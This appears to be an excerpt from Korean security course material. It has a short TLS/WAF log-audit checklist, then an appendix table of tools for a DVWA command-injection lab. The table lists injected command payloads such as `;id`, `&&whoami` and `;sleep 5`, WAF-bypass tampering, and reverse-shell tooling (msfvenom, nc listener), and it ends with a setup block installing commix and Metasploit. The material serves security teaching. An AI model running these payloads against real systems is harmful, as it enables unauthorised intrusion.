1. 점검 대상의 모든 endpoint 가 TLSv1.3 (또는 최소 1.2) 사용하는지 — WAF log 의 `app=` 필드 집계로 확인
2. 5061 의 *Algorithm* 분포 → MD5/SHA1/RSA-1024 사용 endpoint 식별
3. WAF log 의 `WafResponseType` (SERVER vs CLIENT) 으로 인증서 검증 누락 endpoint 자동 분류



---

## 부록: 학습 OSS 도구 매트릭스 (lab week10 — Command Injection)

| step | 카테고리 | 핵심 도구 |
|---|---|---|
| 1 baseline | curl -c / Burp Proxy / DVWA Low |
| 2 ; | curl `;id` / **commix** / PayloadsAllTheThings |
| 3 \| | curl `\|cat` / commix --level=3 / wfuzz |
| 4 && | curl `&&whoami` / commix / Burp Intruder |
| 5 backtick / $() | curl `` `hostname` `` / $(uname) / commix shell escape |
| 6 Medium 우회 | URL/hex 인코딩 / **commix --tamper** / wfuzz payload processing |
| 7 Time-based | curl `;sleep 5` + time / commix --time-sec / Burp Repeater |
| 8 reverse shell | msfvenom / **revshells.com** / nc listener / PayloadsAllTheThings |
| 9 WAF | OWASP CRS 932 / wafw00f / commix --tamper |
| 10 reporting | 메타문자 표 / DefectDojo / OWASP A03 / CVSS / sha256 |

### 학생 환경 준비
```bash
git clone --depth 1 https://github.com/commixproject/commix ~/commix
pip install commix
sudo apt install -y ncat netcat-openbsd metasploit-framework
# revshells.com — 웹 브라우저
# PayloadsAllTheThings/Methodology and Resources/Reverse Shell Cheatsheet.md
```
